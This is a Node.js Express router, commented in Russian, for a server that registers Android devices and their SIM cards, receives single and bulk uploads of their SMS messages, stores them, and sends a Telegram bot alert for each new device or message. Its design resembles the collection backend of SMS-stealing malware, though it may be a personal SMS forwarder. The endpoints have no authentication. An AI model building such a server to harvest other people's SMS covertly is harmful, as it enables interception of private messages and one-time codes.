const express = require('express');
const router = express.Router();
const Device = require('../models/Device');
const SmsMessage = require('../models/SmsMessage');
const botController = require('../controllers/botController');

// Регистрация нового устройства
router.post('/register-device', async (req, res) => {
    try {
        const { deviceId, deviceModel, androidVersion, simCards } = req.body;

        // Проверяем, существует ли устройство
        let device = await Device.findOne({ deviceId });

        if (device) {
            // Если устройство уже существует, обновляем информацию
            device.deviceModel = deviceModel;
            device.androidVersion = androidVersion;
            device.simCards = simCards;
            device.lastActiveAt = new Date();
            await device.save();
        } else {
            // Если устройство новое, создаем запись
            device = new Device({
                deviceId,
                deviceModel,
                androidVersion,
                simCards
            });
            await device.save();

            // Отправляем уведомление о новом устройстве в Telegram
            await botController.notifyNewDevice(device);
        }

        res.status(200).json({
            success: true,
            message: 'Устройство успешно зарегистрировано',
            data: device
        });
    } catch (error) {
        console.error('Ошибка при регистрации устройства:', error);
        res.status(500).json({
            success: false,
            message: 'Произошла ошибка при регистрации устройства',
            error: error.message
        });
    }
});

// Получение SMS-сообщения
router.post('/send-sms', async (req, res) => {
    try {
        const { sender, text, timestamp, simSlot, deviceId } = req.body;

        // Проверяем, существует ли устройство
        const device = await Device.findOne({ deviceId });
        if (!device) {
            return res.status(404).json({
                success: false,
                message: 'Устройство не найдено'
            });
        }

        // Обновляем время последней активности устройства
        device.lastActiveAt = new Date();
        await device.save();

        // Создаем новое SMS сообщение
        const smsMessage = new SmsMessage({
            sender,
            text,
            timestamp: timestamp ? new Date(timestamp) : new Date(),
            simSlot,
            deviceId
        });
        await smsMessage.save();

        // Отправляем уведомление о новом SMS в Telegram
        await botController.notifyNewSms(smsMessage, device);

        res.status(200).json({
            success: true,
            message: 'SMS-сообщение успешно получено',
            data: smsMessage
        });
    } catch (error) {
        console.error('Ошибка при получении SMS:', error);
        res.status(500).json({
            success: false,
            message: 'Произошла ошибка при получении SMS',
            error: error.message
        });
    }
});

// Получение массива SMS-сообщений
router.post('/send-all-sms', async (req, res) => {
    try {
        const messages = req.body;
        
        if (!Array.isArray(messages) || messages.length === 0) {
            return res.status(400).json({
                success: false,
                message: 'Необходимо предоставить массив сообщений'
            });
        }

        // Получаем deviceId из первого сообщения для проверки устройства
        const deviceId = messages[0].deviceId;

        // Проверяем, существует ли устройство
        const device = await Device.findOne({ deviceId });
        if (!device) {
            return res.status(404).json({
                success: false,
                message: 'Устройство не найдено'
            });
        }

        // Обновляем время последней активности устройства
        device.lastActiveAt = new Date();
        await device.save();

        // Сохраняем все сообщения
        const savedMessages = [];
        for (const message of messages) {
            const smsMessage = new SmsMessage({
                sender: message.sender,
                text: message.text,
                timestamp: message.timestamp ? new Date(message.timestamp) : new Date(),
                simSlot: message.simSlot,
                deviceId: message.deviceId
            });
            await smsMessage.save();
            savedMessages.push(smsMessage);
        }

        // Уведомляем о загрузке сообщений в Telegram
        await botController.notifyBulkSmsUpload(savedMessages.length, device);

        res.status(200).json({
            success: true,
            message: `Успешно получено ${savedMessages.length} SMS-сообщений`,
            data: {
                count: savedMessages.length
            }
        });
    } catch (error) {
        console.error('Ошибка при получении массива SMS:', error);
        res.status(500).json({
            success: false,
            message: 'Произошла ошибка при получении массива SMS',
            error: error.message
        });
    }
});

module.exports = router; 